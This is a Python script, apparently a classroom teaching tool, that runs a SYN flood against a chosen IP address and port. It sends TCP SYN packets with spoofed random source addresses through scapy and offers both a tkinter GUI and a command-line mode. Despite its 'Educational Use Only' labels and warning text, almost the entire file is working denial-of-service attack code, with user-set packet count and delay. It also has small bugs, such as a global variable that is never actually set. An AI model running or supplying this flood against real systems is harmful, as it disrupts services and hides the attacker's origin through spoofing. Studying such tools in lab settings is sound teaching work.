import sys
import time
import random
from scapy.all import *
import tkinter as tk
from tkinter import ttk, messagebox
import psutil
import socket

global_src_IP = None

def get_src_ip():
    networks = ['10.','172','192']
    for iface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            print(addr)
            if addr.family == socket.AF_INET and addr.address[:3] in networks:
                addr_split = addr.address.split(".")
                subn_split = addr.netmask.split(".")
                if(subn_split[1] == "0"): 
                    global_src_IP = f"{addr_split[0]}.x.y.z"
                    return
                if(subn_split[2] == "0"): 
                    global_src_IP = f"{addr_split[0]}.{addr_split[1]}.x.y"
                    return
                if(subn_split[3] == "0"): 
                    global_src_IP = f"{addr_split[0]}.{addr_split[1]}.{addr_split[2]}.x"
                    return
                subn_split - None
                addr_split = None

def get_rand_ip():
    if(global_src_IP is None): get_src_ip()
    random_IP = global_src_IP.replace("x", str(random.randint(1, 254)))
    random_IP = random_IP.replace("y", str(random.randint(1, 254)))
    random_IP = random_IP.replace("z", str(random.randint(1, 254)))
    return random_IP

def guiFunction():
    def synFlood(destIP, destPort, packetCount, delay=0.1, outputText=None):
        if outputText:
            outputText.insert(tk.END, "[+] Starting SYN Flood Simulation (Educational Use Only)\n")
            outputText.insert(tk.END, f"[+] Target: {destIP}:{destPort}\n")
            outputText.insert(tk.END, f"[+] Sending {packetCount} packets with {delay}s delay\n\n")
            outputText.see(tk.END)  
        else:
            print(f"[+] Starting SYN Flood Simulation (Educational Use Only)")
            print(f"[+] Target: {destIP}:{destPort}")
            print(f"[+] Sending {packetCount} packets with {delay}s delay\n")

        for i in range(1, packetCount + 1):
            srcIP = get_rand_ip()
            packet = IP(src=srcIP, dst=destIP) / TCP(sport=RandShort(), dport=destPort, flags="S")

            try:
                send(packet, verbose=0)
                message = f"[→] Packet {i}: {srcIP} → {destIP}:{destPort} (SYN)\n"
                if outputText:
                    outputText.insert(tk.END, message)
                    outputText.see(tk.END)
                else:
                    print(message)
                time.sleep(delay)
            except Exception as e:
                errorMessage = f"[!] Error: {e}\n"
                if outputText:
                    outputText.insert(tk.END, errorMessage)
                    outputText.see(tk.END)
                else:
                    print(errorMessage)
                break

        completionMessage = "\n[✓] Simulation Complete\n"
        if outputText:
            outputText.insert(tk.END, completionMessage)
            outputText.see(tk.END)
        else:
            print(completionMessage)

    def runSimulation():
        destIP = ipEntry.get()
        try:
            destPort = int(portEntry.get())
            packetCount = int(countEntry.get())
            delay = float(delayEntry.get())
        except ValueError:
            messagebox.showerror("Error", "Please enter valid integer values for Port and Packet Count, and a valid float for Delay.")
            return

        if not destIP:
            messagebox.showerror("Error", "Please enter a Destination IP address.")
            return

        runButton.config(state=tk.DISABLED)
        
        outputText.delete(1.0, tk.END)
        
        import threading
        thread = threading.Thread(target=synFlood, args=(destIP, destPort, packetCount, delay, outputText))
        thread.start()
        
        root.after(5000, lambda: runButton.config(state=tk.NORMAL)) 

    def showHelp():
        helpText = """
        SYN Flood Simulator (Educational Use Only)

        This tool simulates a SYN flood attack for educational purposes.
        It sends a specified number of SYN packets to a target IP address and port.

        Usage:
        1. Enter the Destination IP address of the target.
        2. Enter the Destination Port number.
        3. Enter the number of Packets you want to send.
        4. Optionally, adjust the Delay (in seconds) between sending each packet.
        5. Click 'Start Simulation' to begin.

        The output of the simulation will be displayed in the 'Output' area below.

        WARNING: This tool should only be used in controlled, educational environments
        where you have explicit permission to conduct such tests. Unauthorized use
        is illegal and unethical.

        Created by Kaled Aljebur for learning purposes in teaching classes.
        """
        
        top = tk.Toplevel(root)
        top.title("Help")
        helpLabel = tk.Label(top, text=helpText, justify=tk.LEFT, padx=10, pady=10)
        helpLabel.pack(padx=10, pady=10)
        closeButton = ttk.Button(top, text="Close", command=top.destroy)
        closeButton.pack(pady=5)

    print("Please follow the GUI window.")
    print("Created by Kaled Aljebur for learning purposes in teaching clases.")
    root = tk.Tk()
    root.title("SYN Flood Simulator (Educational)")

    mainFrame = ttk.Frame(root, padding="10")
    mainFrame.grid(column=0, row=0, sticky=(tk.W, tk.E, tk.N, tk.S))
    root.columnconfigure(0, weight=1)
    root.rowconfigure(0, weight=1)
    
    ipLabel = ttk.Label(mainFrame, text="Destination IP:")
    ipLabel.grid(column=0, row=0, sticky=tk.W)
    ipEntry = ttk.Entry(mainFrame)
    ipEntry.grid(column=1, row=0, sticky=(tk.W, tk.E))
    ipEntry.insert(0, "192.168.8.40")  
    
    portLabel = ttk.Label(mainFrame, text="Destination Port:")
    portLabel.grid(column=0, row=1, sticky=tk.W)
    portEntry = ttk.Entry(mainFrame)
    portEntry.grid(column=1, row=1, sticky=(tk.W, tk.E))
    portEntry.insert(0, "80")  
    
    countLabel = ttk.Label(mainFrame, text="Packet Count:")
    countLabel.grid(column=0, row=2, sticky=tk.W)
    countEntry = ttk.Entry(mainFrame)
    countEntry.grid(column=1, row=2, sticky=(tk.W, tk.E))
    countEntry.insert(0, "30")  
    
    delayLabel = ttk.Label(mainFrame, text="Delay (seconds):")
    delayLabel.grid(column=0, row=3, sticky=tk.W)
    delayEntry = ttk.Entry(mainFrame)
    delayEntry.grid(column=1, row=3, sticky=(tk.W, tk.E))
    delayEntry.insert(0, "0.1") 

    runButton = ttk.Button(mainFrame, text="Start Simulation", command=runSimulation)
    runButton.grid(column=0, row=4, columnspan=2, pady=10)
    
    helpButton = ttk.Button(mainFrame, text="Help", command=showHelp)
    helpButton.grid(column=0, row=5, columnspan=2, pady=5)
    
    outputLabel = ttk.Label(mainFrame, text="Output:")
    outputLabel.grid(column=0, row=5, sticky=tk.W)
    outputText = tk.Text(mainFrame, height=10, width=40)
    outputText.grid(column=0, row=6, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S))
    outputScrollbar = ttk.Scrollbar(mainFrame, command=outputText.yview)
    outputScrollbar.grid(column=2, row=6, sticky=(tk.N, tk.S))
    outputText.config(yscrollcommand=outputScrollbar.set)
    
    for child in mainFrame.winfo_children():
        child.grid_configure(padx=5, pady=5)

    root.mainloop()

def arguFunction():
    def synFloodArgu(destIP, destPort, packetCount, delay=0.1):
        print(f"[+] Starting SYN Flood Simulation (Educational Use Only)")
        print(f"[+] Target: {destIP}:{destPort}")
        print(f"[+] Sending {packetCount} packets with {delay}s delay\n")
        
        for i in range(1, packetCount + 1):
            srcIP = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
            packet = IP(src=srcIP, dst=destIP) / TCP(sport=RandShort(), dport=destPort, flags="S")
            
            try:
                send(packet, verbose=0)
                print(f"[→] Packet {i}: {srcIP} → {destIP}:{destPort} (SYN)")
                time.sleep(delay)
            except Exception as e:
                print(f"[!] Error: {e}")
                break
        
        print("\n[✓] Simulation Complete")

    # print("Example: sudo python ddos-attack.py 192.168.8.40 80 30.")
    destIP = sys.argv[1]
    destPort = int(sys.argv[2])
    packetCount = int(sys.argv[3])
    
    synFloodArgu(destIP, destPort, packetCount, delay=0.1)

def helpMenu():
    helpText2 = """
    Created by Kaled Aljebur for learning purposes in teaching classes.
    Usage 1 for GUI window: sudo python ddos-attack.py.
    Usage 2 for terminal only: sudo python ddos-attack.py <destIP> <destPort> <packetCount>.
    Example: sudo python ddos-attack.py 192.168.8.40 80 30.

    To see the traffic, use Wireshark with `tcp.port == 80` filter, or whatever port used in the command.    
    Make sure the service is running and not blocked by firewall in the target, 
    otherwise you will not see [SYN, ACK] flag in Wireshark.
    """
    print(helpText2)
    sys.exit(1) 

if __name__ == "__main__":
    if len(sys.argv) == 1:
        guiFunction()
    elif len(sys.argv) == 4:
        arguFunction()
    else:
        helpMenu()